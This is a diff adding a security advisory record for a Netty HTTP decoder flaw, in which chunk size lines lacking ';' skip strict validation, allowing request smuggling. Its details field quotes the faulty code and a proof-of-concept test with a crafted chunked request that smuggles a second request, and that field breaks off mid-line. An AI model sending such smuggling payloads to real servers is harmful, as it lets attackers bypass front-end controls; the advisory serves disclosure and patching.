@@ -1,0 +1,38 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-9mrj-55p4-qwf4",
+  "modified": "2026-09-18T15:32:20Z",
+  "published": "2026-09-18T15:32:20Z",
+  "aliases": [
+    "CVE-2026-93566"
+  ],
+  "details": "### Summary\nNetty skips strict chunk size line validation when the line has no chunk extension (`;`), so a chunk size line containing an embedded bare CR (e.g. `0\\rX`) is accepted instead of rejected, enabling HTTP request smuggling.\n\n### Details\n`io.netty.handler.codec.http.HttpObjectDecoder#checkChunkExtensions` only runs the strict validator `HttpChunkLineValidatingByteProcessor` when a `;` is present:\n\n```java\n        int extensionsStart = line.bytesBefore((byte) ';');\n        if (extensionsStart == -1) {\n            return;\n        }\n```\n\nAccording to RFC 9112 https://datatracker.ietf.org/doc/html/rfc9112#appendix-A\n\n`chunk-size = 1*HEXDIG`\n\n### PoC\n\n```java\n@Test\npublic void test() {\n    String requestStr = \"POST / HTTP/1.1\\r\\n\" +\n            \"Host: localhost\\r\\n\" +\n            \"Transfer-Encoding: chunked\\r\\n\\r\\n\" +\n            \"0\\rX\\r\\n\" +\n            \"\\r\\n\" +\n            \"GET /smuggled HTTP/1.1\\r\\n\" +\n            \"Host: localhost\\r\\n\" +\n            \"Content-Length: 0\\r\\n\" +\n            \"\\r\\n\";\n\n    EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());\n    assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, Ch",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-93566"
+    },
+    {
+      "type": "WEB",
+      "url": "https://access.redhat.com/security/cve/CVE-2026-93566"
+    },
+    {
+      "type": "WEB",
+      "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2536954"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [],
+    "severity": "MODERATE",
+    "github_reviewed": false,
+    "github_reviewed_at": null,
+    "nvd_published_at": "2026-09-18T15:17:20Z"
+  }
+}
